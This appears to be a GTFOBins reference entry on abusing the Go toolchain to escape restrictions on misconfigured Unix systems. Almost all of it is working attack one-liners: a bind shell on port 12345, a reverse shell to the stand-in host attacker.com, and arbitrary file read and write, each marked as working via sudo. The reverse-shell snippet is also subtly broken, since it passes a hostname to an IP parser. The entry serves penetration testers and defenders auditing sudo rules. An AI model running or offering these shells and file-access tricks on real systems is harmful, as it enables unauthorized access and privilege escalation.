GTFOBins reference entry: go.
GTFOBins documents how legitimate Unix binaries can be abused to bypass local security restrictions in misconfigured systems.
bind-shell: echo -e 'package main
import (
	"os"
	"syscall"
)

func main(){
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	addr := &syscall.SockaddrInet4{Port: 12345}
	copy(addr.Addr[:], []byte{0,0,0,0})
	syscall.Bind(fd, addr)
	syscall.Listen(fd, 1)
	nfd, _, _ := syscall.Accept(fd)
	syscall.Dup2(nfd, 0)
	syscall.Dup2(nfd, 1)
	syscall.Dup2(nfd, 2)
	syscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())
}' >/path/to/temp-file.go go run /path/to/temp-file.go (works via sudo, unprivileged).
file-read: echo -e 'package main
import (
	"fmt"
	"os"
)

func main(){
	b, _ := os.ReadFile("/path/to/input-file")
	fmt.Print(string(b))
}' >/path/to/temp-file.go go run /path/to/temp-file.go (works via sudo, unprivileged).
file-write: echo -e 'package main
import "os"
func main(){
	f, _ := os.OpenFile("/path/to/output-file", os.O_RDWR|os.O_CREATE, 0644)
	f.Write([]byte("DATA\n"))
	f.Close()
}' >/path/to/temp-file.go go run /path/to/temp-file.go (works via sudo, unprivileged).
reverse-shell: echo -e 'package main
import (
	"os"
	"net"
	"syscall"
)

func main(){
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	ip := net.ParseIP("attacker.com").To4()
	addr := &syscall.SockaddrInet4{Port: 12345}
	copy(addr.Addr[:], ip)
	syscall.Connect(fd, addr)
	syscall.Dup2(fd, 0)
	syscall.Dup2(fd, 1)
	syscall.Dup2(fd, 2)
	syscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())
}' >/path/to/temp-file.go go run /path/to/temp-file.go (works via sudo, unprivileged).
